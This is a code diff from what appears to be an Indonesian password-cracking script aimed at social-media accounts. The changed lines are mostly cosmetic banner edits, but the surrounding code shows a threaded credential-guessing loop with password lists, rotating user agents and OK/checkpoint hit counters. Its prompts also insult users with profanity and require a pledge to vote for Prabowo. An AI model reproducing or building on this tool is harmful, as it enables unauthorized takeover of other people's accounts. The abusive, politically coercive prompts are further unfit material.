@@ -715,7 +715,6 @@ def setting():
 		method.append('metod3')
 	else:
 		method.append('metod1')
-	print('')
 	_jembot_ = input('✶ ━━⫸ {H}Tambahkan Aplikasi Terkait {M}( Y/t ) ')
 	if _jembot_ in ['']:
 		print(' [red]Pilih Yang Bener Kontol ')
@@ -735,7 +734,6 @@ def setting():
 			pwnya.append(xpw)
 	else:
 		pwpluss.append('no')
-	print('')
 	tai = input('✶ ━━⫸ {H}Saya Janji Akan Pilih Prabowo {M}( Y/t ) ')
 	if tai in ['t','T']:
 		print(' [red]Harus Pilih prabowo Klo Ga Pilih Jangan Pke Scnya ')
@@ -745,7 +743,7 @@ def setting():
 	else:
 		print(' [red]Gausah pke scnya kontol klo ga pilih Prabowo ')
 		str(tai)
-	prints(f'╰─▶{B2}Ketik "bismillah" Untuk Memulai Crack, Semoga ijo ')
+	prints(f'.  ╰─▶ {B2}Ketik "bismillah" Untuk Memulai Crack, Semoga ijo ')
 	hc = input(f'✶ ━━⫸ {H} Ketik{N} : ')
 	if hc in ['bismillah','Bismillah','BISMILLAH']:
 		passwrd()
@@ -759,7 +757,7 @@ def passwrd():
 	loading()
 	clear()
 	banner()
-	prints(nel(f'             {M2}!{H} PROSES CRACK SEDANG BERLANGSUNG{M2} !')) 
+	prints(nel(f'                {M2}!{H} PROSES CRACK SEDANG BERLANGSUNG {M2}!')) 
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -1372,7 +1370,7 @@ def kontol(idf,pwv):
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{x}[{asu}RR07{x}] | {P}{asu}{loop}{P} | {H}OK-{ok} {P}| {K}CP-{cp}")
+	sys.stdout.write(f"\r{x}[{M2}RR07{x}] | {P}{asu}{loop}{P} | {H}OK-{ok} {P}| {K}CP-{cp}")
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ses = requests.Session()
